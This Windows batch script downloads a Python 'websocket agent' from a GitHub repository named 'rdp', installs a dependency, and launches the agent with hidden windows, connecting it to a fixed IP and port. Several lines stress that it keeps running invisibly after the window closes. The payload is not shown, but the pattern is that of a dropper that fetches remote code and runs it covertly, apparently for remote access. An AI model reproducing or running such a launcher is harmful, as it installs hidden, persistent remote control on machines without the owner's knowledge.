@echo off
echo Starting WebSocket Agent in background mode...

REM Check if Python script exists, if not download it
if not exist "websocket_agent.py" (
    echo Downloading websocket_agent.py...
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pharaon3/rdp/main/websocket_agent.py' -OutFile 'websocket_agent.py'"
)

REM Install websockets package
echo Installing websockets package...
pip install websockets

REM Start the Python agent in background (no visible window)
echo Starting Python agent in background...
powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '192.168.129.23', '8888', 'test' -WindowStyle Hidden"

echo Agent started successfully!
echo The Python agent is now running completely in the background.
echo No visible terminal window will be opened.
echo You can close this window and the agent will continue running.
pause 